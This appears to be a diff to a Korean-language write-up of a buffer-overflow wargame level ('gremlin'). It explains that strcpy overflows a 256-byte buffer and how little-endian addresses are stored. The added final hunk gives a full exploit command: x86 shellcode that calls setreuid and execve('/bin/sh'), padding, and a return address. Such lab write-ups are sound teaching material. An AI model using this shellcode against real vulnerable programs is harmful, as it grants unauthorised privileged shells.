@@ -53,7 +53,7 @@ int main(int argc, char *argv[])
 ### 소스분석  
 1. argc가 2보다 작다면 "ergv error"을 출력하고 프로그램을 종료한다.  
 **argc란? - 파라미터의 개수를 의미한다. 즉 main에 최소 2개이상의 인자를 전달하여야 한다.**  
-2. main에 전달받은 인자 argv[1](argv[0]은 파일명)을 buffer에 복사하여 출력하는 소스  
+2. main에 전달받은 인자 argv[1]을 buffer에 복사하여 출력하는 소스(argv[0]은 파일명)  
 **strcpy함수는 복사할 데이터의 크기제한이 없기 때문에 argv[1]이 256Byte보다 크다면 buffer-overflow가 발생하는 취약점이 있다.**  
 
 ### Solution  
@@ -142,3 +142,7 @@ ex) 0xbffffc11을 리틀 엔디안 방식으로 저장하면 11cfffbf가 된다.
 보통 엔디안 방식은 CPU 아키텍쳐에 따라 다르지만 intel x86, x64, AMD 계열은 리틀엔디안, 모토로라 프로세서들은 빅엔디안을 사용한다.  
 현재 시스템의 엔디안방식을 확인하고 싶다면 echo -n I | od -to2 | head -n1 | awk'{print $2;}' | cut -c6  
 명령으로 나오는 값이 1이라면 리틀 엔디안, 0이라면 빅엔디안이다.  
+
+```bash
+$ ./gremlin `python -c "print '\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80' + 'A' * 219 + '\x28\xf9\xff\xbf'"`
+```
